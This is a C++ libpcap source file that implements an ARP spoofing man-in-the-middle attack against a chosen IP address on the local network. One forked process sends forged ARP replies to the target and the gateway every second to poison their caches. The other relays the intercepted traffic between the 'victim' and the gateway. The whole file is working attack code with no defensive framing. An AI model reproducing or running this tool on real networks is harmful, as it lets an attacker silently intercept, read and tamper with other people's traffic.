#include <netinet/in.h> // for ntohs() function
#include <pcap.h>       // for packet capturing
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>     // for sleep()
//for STL
#include <vector>
//for struct
#include <netinet/ether.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
//custom headerfile
#include "myLocalAddress.h"
#include "myARPtools.h"

using namespace std;

void init_pcd(pcap_t **pcd, char **dev);
void sendFakeARP(pcap_t *pcd, vector<myAddress> &targetList);
void relayPackets(pcap_t *pcd, vector<myAddress> &targetList);


int main(int argc, char **argv)
{
    pcap_t *pcd;
    char *dev;

    vector<myAddress> targetList;

    myAddress target;

    // init
    printf("pcd init ...");
    init_pcd(&pcd, &dev);
    printf("done\n");

    // check input and specify target
    printf("getting target's MAC address ...");
    if(inet_aton(argv[1], &target.IP)==0)
    {
        printf("\nError: invalid IP : %s \n", argv[1]);
        exit(1);
    }

    if(convertIP2MAC(pcd, target.IP, target.MAC)==-1)
    {
        printf("\nError: given IP(%s) is not in the same network.\n", argv[1]);
        exit(1);
    }
    printf("done.\n");

    targetList.push_back(target);

    // send fake ARP

    if(fork()==0)
    {
        printf("start sending fake ARP\n");
        sendFakeARP(pcd, targetList);
    }
    else
    {
        printf("start relaying packets\n");
        relayPackets(pcd, targetList);
    }

    return 0;
}

void init_pcd(pcap_t **pcd, char **dev)
{
    char errbuf[PCAP_ERRBUF_SIZE];

    *dev = pcap_lookupdev(errbuf);

    if(dev == NULL)
    {
        printf("%s\n",errbuf);
        exit(1);
    }
    
    *pcd = pcap_open_live(*dev, BUFSIZ,  0/*NONPROMISCUOUS*/, -1, errbuf);

    if (*pcd == NULL)
    {
        printf("%s\n", errbuf);
        exit(1);
    }

    return;
}

void sendFakeARP(pcap_t *pcd, vector<myAddress> &targetList)
{
    u_char packet[sizeof(ether_header) + sizeof(ether_arp)];

    while(1)
    {
        for(auto target : targetList)
        {
            // to target
            makeARPpacket(packet, getGateway().IP, getMyAddr().MAC, target.IP, target.MAC, ARPOP_REPLY);
            if(pcap_inject(pcd, packet, sizeof(packet))==-1)
            {
                pcap_perror(pcd,0);
                pcap_close(pcd);
                exit(1);
            }
            // to gateway
            makeARPpacket(packet, target.IP, getMyAddr().MAC, getGateway().IP, getGateway().MAC, ARPOP_REPLY);
            if(pcap_inject(pcd, packet, sizeof(packet))==-1)
            {
                pcap_perror(pcd,0);
                pcap_close(pcd);
                exit(1);
            }
        }
        sleep(1);
    }

    return;
}

void relayPackets(pcap_t *pcd, vector<myAddress> &targetList)
{
    int status;
    ether_header *etherHdr;
    ip           *ipHdr;

    pcap_pkthdr *recvHeader;
    const u_char *recvPacket;

    uint32_t myIP = getMyAddr().IP.s_addr, subMask = getMyAddr().subMask.s_addr;
    uint32_t gIP = getGateway().IP.s_addr;

    while(1)
    {
        status = pcap_next_ex(pcd, &recvHeader, &recvPacket);

        if(status!=1)  continue;

        // check if it's IP packet
        etherHdr = (ether_header*)recvPacket;
        if(etherHdr->ether_type!=htons(ETHERTYPE_IP))
            continue;

        ipHdr = (ip*)(recvPacket + sizeof(ether_header));
        uint32_t srcIP = ipHdr->ip_src.s_addr;
        uint32_t dstIP = ipHdr->ip_dst.s_addr;

        // check if it's gateway(outer world) -> victim
        for(auto target : targetList)
        {
            uint32_t tIP  = target.IP.s_addr;

            if((((srcIP&subMask) != (myIP&subMask))||(srcIP==gIP)) && (dstIP == tIP))
            {
                memcpy(etherHdr->ether_shost, getMyAddr().MAC.ether_addr_octet, ETHER_ADDR_LEN);
                memcpy(etherHdr->ether_dhost, target.MAC.ether_addr_octet,      ETHER_ADDR_LEN);
                if(pcap_inject(pcd, recvPacket, recvHeader->caplen)==-1)
                {
                    pcap_perror(pcd,0);
                    pcap_close(pcd);
                    exit(1);
                }
                break;
            }
        }

        // check if it's victim -> gateway(outer world)
        for(auto target : targetList)
        {
            uint32_t tIP  = target.IP.s_addr;

            if((((dstIP&subMask) != (myIP&subMask))||(dstIP==gIP)) && (srcIP == tIP))
            {
                memcpy(etherHdr->ether_shost, getMyAddr().MAC.ether_addr_octet,  ETHER_ADDR_LEN);
                memcpy(etherHdr->ether_dhost, getGateway().MAC.ether_addr_octet, ETHER_ADDR_LEN);
                if(pcap_inject(pcd, recvPacket, recvHeader->caplen)==-1)
                {
                    pcap_perror(pcd,0);
                    pcap_close(pcd);
                    exit(1);
                }
                break;
            }
        }
    }

    return;
}